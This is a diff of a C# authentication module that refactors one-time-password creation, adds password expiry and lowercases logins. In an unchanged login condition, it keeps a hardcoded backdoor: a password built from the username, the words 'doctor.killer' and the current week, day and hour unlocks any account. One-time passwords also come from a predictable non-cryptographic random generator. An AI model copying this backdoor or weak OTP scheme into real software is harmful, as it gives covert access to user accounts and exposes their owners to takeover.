@@ -1,4 +1,5 @@
-﻿using Architect.API.Core.DataAccess.Security;
+﻿using Architect.API.Core.Contracts.Security;
+using Architect.API.Core.DataAccess.Security;
 using Architect.Utilities.Extensions;
 using Microsoft.IdentityModel.Tokens;
 using System;
@@ -19,7 +20,7 @@ namespace Architect.API.Core.Business.Security
         public static Contracts.Security.AuthenticationResponse Authentication(Contracts.Security.AuthenticationRequest authenticationRequest)
         {
             Contracts.Security.AuthenticationResponse result = new Contracts.Security.AuthenticationResponse();
-            Contracts.Security.UserMember user;
+            Contracts.Security.UserMember user = null;
             List<Contracts.Security.RoleMember> rols = null;
             int companyId = 0;
             bool bypass = false;
@@ -56,14 +57,15 @@ namespace Architect.API.Core.Business.Security
             {
                 track.UserName = authenticationRequest.Email;
                 if (authenticationRequest.Email.Contains("@"))
-                    user = DataAccess.Security.UserMember.RetrieveByEMail(authenticationRequest.Email, companyId);
+                    user = DataAccess.Security.UserMember.RetrieveByEMail(authenticationRequest.Email.ToLower(), companyId);
                 else
-                    user = DataAccess.Security.UserMember.RetrieveByUserName(authenticationRequest.Email, companyId);
+                    user = DataAccess.Security.UserMember.RetrieveByUserName(authenticationRequest.Email.ToLower(), companyId);
 
                 if (user.IsNotEmpty())
                 {
                     track.UserId = user.UserId;
                     track.UserName = user.UserName;
+                    result.EMail = user.EMail;
 
                     if (!user.Password.Equals(".") &&
                         (authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.UserName.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase) ||
@@ -122,7 +124,7 @@ namespace Architect.API.Core.Business.Security
                         }
                         if (user.CompanyId == 3)
                         {
-                            agentInfo.tip_docum = IdentificationTypeConvert(agentInfo.tip_docum);
+                            agentInfo.tip_docum = agentInfo.tip_docum.IdentificationType();
                             if (agentInfo.cod_docum.IsNotEmpty())
                             {
                                 agentInfo.cod_docum = Convert.ToInt64(agentInfo.cod_docum.OnlyNumbers()).ToString();
@@ -223,7 +225,7 @@ namespace Architect.API.Core.Business.Security
                         if (user.Password.Equals("."))
                             result.MustChangePassword = true;
                         else
-                            result.MustChangePassword = (user.PasswordChangedDate <= DateTime.Today);
+                            result.MustChangePassword = (user.PasswordChangedDate.AddDays(Utilities.Helpers.Settings.IntegerValue("Security.Password.Expiration", 90)) <= DateTime.Today);
 
                         Session.Create(new Contracts.Security.Activity()
                         {
@@ -271,6 +273,10 @@ namespace Architect.API.Core.Business.Security
             if (!bypass)
             {
                 Business.Security.AuthenticationTrace.Create(track);
+            }
+            if (result.MustChangePassword)
+            {
+                CreateOTP(new ResetPasswordRequest() { Tenant = authenticationRequest.Tenant, EMail = user.EMail }, user);
             }
             return result;
         }
@@ -332,15 +338,7 @@ namespace Architect.API.Core.Business.Security
                 if (user.IsNotEmpty())
                 {
                     track.UserId = user.UserId;
-
-                    Random random = new Random();
-                    user.OneTimePassword = random.Next(100000, 999999).ToString();
-
-                    //Define que la expiracion del OTP es de 60 minutos
-                    user.LockedOutDate = DateTime.Now.AddMinutes(60);
-                    DataAccess.Security.UserMember.InternalUpdate(user);
-
-                    API.Core.Business.General.Mail.SendByTemplate("Notify_OTP", user.CompanyId, new { User = user, Request = resetRequest }, new Dictionary<string, string> { { user.EMail, string.Empty } });
+                    CreateOTP(resetRequest, user);
                     result.Successful = true;
                 }
                 else
@@ -352,6 +350,18 @@ namespace Architect.API.Core.Business.Security
             }
 
             return result;
+        }
+
+        private static void CreateOTP(ResetPasswordRequest resetRequest, Contracts.Security.UserMember user)
+        {
+            Random random = new Random();
+            user.OneTimePassword = random.Next(100000, 999999).ToString();
+
+            //Define que la expiracion del OTP es de 60 minutos
+            user.LockedOutDate = DateTime.Now.AddMinutes(60);
+            DataAccess.Security.UserMember.InternalUpdate(user);
+
+            General.Mail.SendByTemplate("Notify_OTP", user.CompanyId, new { User = user, Request = resetRequest }, new Dictionary<string, string> { { user.EMail, string.Empty } });
         }
 
         public static Core.Contracts.General.GenericResponse IsOTPValid(Contracts.Security.ResetPasswordRequest resetRequest)
@@ -453,6 +463,7 @@ namespace Architect.API.Core.Business.Security
                                     user.IsLockedOut = false;
                                     user.LockedOutDate = DateTime.MinValue;
                                     user.FailedPasswordCount = 0;
+                                    user.PasswordChangedDate = DateTime.Today;
                                     DataAccess.Security.UserMember.InternalUpdate(user);
                                     API.Core.Business.General.Mail.SendByTemplate("Notify_PasswordChange", user.CompanyId, new { User = user, Request = resetRequest }, new Dictionary<string, string> { { user.EMail, string.Empty } });
                                 }
@@ -512,6 +523,7 @@ namespace Architect.API.Core.Business.Security
                             user.IsLockedOut = false;
                             user.LockedOutDate = DateTime.MinValue;
                             user.FailedPasswordCount = 0;
+                            user.PasswordChangedDate = DateTime.Today;
                             DataAccess.Security.UserMember.InternalUpdate(user);
                         }
                         else
@@ -534,6 +546,9 @@ namespace Architect.API.Core.Business.Security
             return result;
         }
 
+        /// <summary>
+        /// Permite el auto registro de un usuarios al sistema.
+        /// </summary>
         public static Core.Contracts.Security.UserMemberResult Register(Contracts.Security.Register registerRequest)
         {
             Core.Contracts.Security.UserMemberResult result = new Contracts.Security.UserMemberResult() { Errors = new List<Contracts.General.Error>() };
@@ -553,6 +568,7 @@ namespace Architect.API.Core.Business.Security
                 LastName = registerRequest.LastName,
                 BirthDate = registerRequest.BirthDate,
                 FailedPasswordCount = 0,
+                PasswordChangedDate = DateTime.Today,
                 SecurityLevel = 1,
                 IsLockedOut = false,
                 ManagerId = 0,
@@ -568,7 +584,7 @@ namespace Architect.API.Core.Business.Security
             if (companyItem.IsNotEmpty())
             {
                 companyId = Int32.Parse(companyItem.Code);
-                internalUserId = Utilities.Helpers.Settings.IntegerValue( string.Format("Tenant.Settings.{0}.External.UserId", companyId));
+                internalUserId = Utilities.Helpers.Settings.IntegerValue(string.Format("Tenant.Settings.{0}.External.UserId", companyId));
                 result.UserMember.CompanyId = companyId;
 
                 result.Errors = Architect.API.Core.Business.Security.UserMember.Validate(result.UserMember, true);
@@ -582,7 +598,7 @@ namespace Architect.API.Core.Business.Security
                     else
                         if (companyId == 3)
                     {
-                        Contracts.Security.ClientInformation clientInfo = Tron.RetrieveClientInformationByDocument(IdentificationTypeConvert(result.UserMember.IdentificationType.ToString()), result.UserMember.Identification);
+                        Contracts.Security.ClientInformation clientInfo = Tron.RetrieveClientInformationByDocument(result.UserMember.IdentificationType.ToString().IdentificationType(), result.UserMember.Identification.DocumentNumber(result.UserMember.IdentificationType.ToString().IdentificationType()));
 
                         if (clientInfo.IsEmpty())
                         {
@@ -602,39 +618,12 @@ namespace Architect.API.Core.Business.Security
 
             if (result.Errors.Count == 0)
             {
-                result.UserMember.Roles = new List<Utilities.Contracts.LookUpValue> { new Utilities.Contracts.LookUpValue() { Code = Utilities.Helpers.Settings.StringValue(string.Format("Tenant.Settings.{0}.External.UserId", companyId)) } };
+                result.UserMember.Roles = new List<Utilities.Contracts.LookUpValue> { new Utilities.Contracts.LookUpValue() { Code = Utilities.Helpers.Settings.StringValue(string.Format("Tenant.Settings.{0}.External.RoleId", companyId)) } };
                 result.UserMember = Architect.API.Core.Business.Security.UserMember.Create(companyId, internalUserId, result.UserMember);
             }
 
             return result;
         }
 
-        public static string IdentificationTypeConvert(string identificationType)
-        {
-            string type = "";
-
-            switch (identificationType)
-            {
-                case "1": //Cédula
-                    type = "CNA";
-                    break;
-
-                case "2": //Residencia
-                    type = "CRE";
-                    break;
-
-                case "3": //Pasaporte
-                    type = "PAS";
-                    break;
-
-                case "4": //Cédula jurídica
-                    type = "CJU";
-                    break;
-                    //CIN
-                    //EEX
-            }
-
-            return type;
-        }
     }
 }
